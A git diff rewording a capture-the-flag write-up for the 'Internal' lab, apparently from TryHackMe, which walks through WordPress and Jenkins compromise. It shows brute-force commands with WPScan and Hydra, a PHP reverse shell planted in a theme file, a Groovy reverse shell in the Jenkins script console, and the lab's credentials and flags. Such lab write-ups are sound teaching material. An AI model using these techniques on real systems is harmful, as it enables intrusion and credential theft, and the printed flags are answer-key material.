@@ -11,24 +11,23 @@
 **Target IP:** `10.48.157.111`
 
 ---
-## Enumeration
+## Recon
 
-An initial Nmap scan was performed against the target to identify open ports, running services, and the operating system:
+I'll start with an nmap scan to identify open ports, running services, and the operating system:
 
 ```
 nmap -sC -sV -Pn -O 10.48.157.111 -oN Internal
 ```
 
-The scan revealed two open ports: **port 22 (SSH)** and **port 80 (HTTP)**. Since SSH needs valid credentials to be useful and we didn't have any yet, port 80 was the logical place to start digging.
+The scan reveals just two open ports, `22` for SSH and `80` for HTTP. Since SSH needs valid credentials before it's of any real use, and we don't have any yet, so I'll start enumerating port 80.
 
 ![](Assets/Nmap.png)
 
-
-Browsing to `http://10.48.157.111` just gave us the default Apache2 landing page - nothing custom, nothing useful in the page source either. So we moved on to directory brute-forcing to see if anything was hidden behind the default page.
+Browsing to `http://10.48.157.111` just gives us the default Apache2 landing page, nothing custom, and nothing useful sitting in the page source either. So I move on to directory brute forcing, to see if there's something hidden behind that default page.
 
 ![](Assets/Default_Apache.png)
 
-Using `ffuf` with a medium-sized wordlist, we enumerated hidden directories:
+Using `ffuf` with a medium-sized wordlist, I enumerate hidden directories:
 
 ```
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.48.157.111/FUZZ 
@@ -36,68 +35,61 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://1
 
 ![](Assets/Directory_Burteforcing.png)
 
-
-This turned up a `/blog/` directory, which hosted a completely different interface from the default Apache page - a strong sign we'd found the real application.
+This turns up a `/blog/` directory, which hosts a completely different interface from the default Apache page, a strong sign that this is where the real application actually lives.
 
 ![](Assets/Interface.png)
 
-
-Navigating to `http://10.48.157.111/blog/` revealed a WordPress-style site. A bit more digging led us to the login page at `http://internal.thm/blog/wp-login.php`.
+Navigating to `http://10.48.157.111/blog/` reveals a WordPress-style site, and a bit more digging leads me to the login page at `http://internal.thm/blog/wp-login.php`.
 
 ![](Assets/login_page.png)
 
 ## Foothold
 
-I tried a few default and commonly used credentials against the login page and confirmed that the username **admin** was valid - the login form's error message gave this away even without knowing the password yet.
+I try a few default and commonly used credentials against the login page, and this confirms that the username `admin` is valid, since the login form's error message gives it away even before I know the actual password.
 
 ![](Assets/admin.png)
 
-To recover the password, we used WPScan to brute-force the admin account via WordPress's **XML-RPC interface**. XML-RPC is worth targeting specifically because it allows multiple login attempts to be bundled into a single request, which makes brute-forcing through it noticeably faster than hitting the normal login form directly:
+To recover the password, I use `WPScan` to brute-force the `admin` account through WordPress's XML-RPC interface. XML-RPC is worth targeting specifically here, since it allows multiple login attempts to be bundled into a single request, which makes brute-forcing through it noticeably faster than hitting the normal login form directly:
 
 ```
 sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/blog/
 ```
 
-
-After waiting a few minutes, this attack successfully returned a valid password for the `admin` account.
+After waiting a few minutes, this successfully returns a valid password for the `admin` account.
 
 ![700](Assets/admin_password.png)
 
-
-We logged in with the recovered credentials, which took us to the WordPress dashboard. A "Remind me later" prompt appeared on first login, so we just dismissed it and moved on.
+I log in with the recovered credentials, which takes me straight to the WordPress dashboard. A "Remind me later" prompt appears on first login, so I just dismiss it and move on.
 
 ![](Assets/Remind_me_later.png)
 
-With dashboard access secured, our next goal was to find a way to execute code on the server. WordPress admins have access to **Appearance → Theme Editor**, which lets us directly edit the PHP files of any installed theme. 
+With dashboard access secured, my next goal is finding a way to execute code on the server. WordPress admins have access to `Appearance → Theme Editor`, which lets us directly edit the PHP files belonging to any installed theme, so this is a natural path toward getting a shell.
 
 ![](Assets/dashboard2.png)
 
-An inactive theme can be selected to avoid corrupting the primary theme. An alternate theme such as `Twenty Seventeen` can be chosen instead.
+To avoid corrupting the site's primary theme, I pick an inactive one instead, going with `Twenty Seventeen`.
 
 ![](Assets/theme.png)
 
-We inserted a PHP reverse shell payload, sourced from [pentestmonkey's php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), into the theme's `404.php` file.
+I insert a PHP reverse shell payload, sourced from [pentestmonkey's php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), into that theme's `404.php` file.
 
 ![](Assets/payload.png)
 
-
-After saving the file, we started a netcat listener on our attack machine and triggered the payload by browsing to:
+After saving the file, I start a `netcat` listener on my attack machine and trigger the payload by browsing to:
 
 ```
 http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
 ```
 
-
-This returned a reverse shell connection, confirming our foothold on the target.
+This returns a reverse shell connection, confirming a foothold on the target.
 
 ![](Assets/reverse-shell.png)
 
-
-Navigating to the home directory, we found a user folder, but our current shell (running as the web server user) didn't have the privileges to access its contents directly.
+Navigating to the home directory, I find a user folder, but the current shell, which is running as the web server user, doesn't have the privileges needed to access its contents directly.
 
 ![](Assets/denied.png)
 
-I spent roughly thirty minutes manually poking around before running a broader search for text files across the filesystem, since config files, notes, and leftover credentials are often stored in plain `.txt` files:
+After spending roughly thirty minutes poking around manually, I run a broader search for text files across the filesystem instead, since config files, notes, and leftover credentials often end up sitting in plain `.txt` files:
 
 ```
 find / -type f -name "*.txt" 2>/dev/null
@@ -105,46 +97,41 @@ find / -type f -name "*.txt" 2>/dev/null
 
 ![](Assets/txt2.png)
 
-
-Reading through the results, one file revealed the credentials `aubreanna:bubb13guM!@#123`.
+Reading through the results, one file reveals the credentials `aubreanna:bubb13guM!@#123`.
 
 ![](Assets/credentials2.png)
 
-
-Switching to the `aubreanna` account with these credentials gave us access to the **user flag**: `THM{int3rna1_fl4g_1}`
+Switching to the `aubreanna` account with these credentials gives us access to the user flag: `THM{int3rna1_fl4g_1}`.
 
 ![700](Assets/user.txt.png)
 
 ## Privilege Escalation
 
-Continuing our enumeration under this user, we found a file named `jenkins.txt`, which pointed us to a hidden service running internally on **port 8080**, meaning it wasn't reachable directly from our attack machine over the network.
+Continuing enumeration under this user, I find a file named `jenkins.txt`, which points to a hidden service running internally on port `8080`, meaning it isn't reachable directly from my attack machine over the network.
 
 ![](Assets/hidden.png)
 
-Since the Jenkins service was not directly reachable, an SSH local port forward was established to tunnel traffic from the attack machine to the target's internal service:
+Since the Jenkins service isn't directly reachable, I set up an SSH local port forward to tunnel traffic from my attack machine through to the target's internal service:
 
 ```
 ssh -L 1234:localhost:8080 aubreanna@10.48.157.111
 ```
 
-
-With the tunnel in place, we could access the Jenkins web interface locally at `http://127.0.0.1:1234`.
+With the tunnel in place, I can now access the Jenkins web interface locally at `http://127.0.0.1:1234`.
 
 ![](Assets/jenkins.png)
 
-
-We then brute-forced the Jenkins login form using Hydra to recover valid administrator credentials:
+I then brute-force the Jenkins login form using `Hydra` to try and recover valid administrator credentials:
 
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 1234 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password'
 ```
 
-
-This returned valid credentials, `admin:spongebob`, which we used to log in successfully.
+This returns valid credentials, `admin:spongebob`, which I use to log in successfully
 
 ![](Assets/creds.png)
 
-With administrative access confirmed, we had access to Jenkins's built-in **Script Console** at `http://127.0.0.1:1234/script`. Using this script console, we can run arbitrary commands, functioning similarly to a web shell. Here, we used the following script to get a reverse shell:
+With administrative access confirmed, I now have access to Jenkins's built-in Script Console at `http://127.0.0.1:1234/script`. Using this script console, I can run arbitrary commands, which functions essentially the same as having a web shell. I use the following script to get a reverse shell:
 
 ```
 r = Runtime.getRuntime()
@@ -154,12 +141,11 @@ p.waitFor()
 
 ![](Assets/console.png)
 
-
-Running this script gave us a reverse shell on our netcat listener. From here, we checked `/opt` and found a `note.txt` file containing the root credentials `root:tr0ub13guM!@#123`.
+Running this script gives us a reverse shell on my `netcat` listener. From here, I check `/opt` and find a `note.txt` file containing the root credentials `root:tr0ub13guM!@#123`.
 
 ![](Assets/root.png)
 
-We logged in as root over SSH using these credentials, confirming full compromise of the machine and giving us access to the **root flag**: `THM{d0ck3r_d3str0y3r}`.
+I log in as `root` over SSH using these credentials, confirming full compromise of the machine and giving us access to the root flag: `THM{d0ck3r_d3str0y3r}`.
 
 ![](Assets/root.txt.png)
 
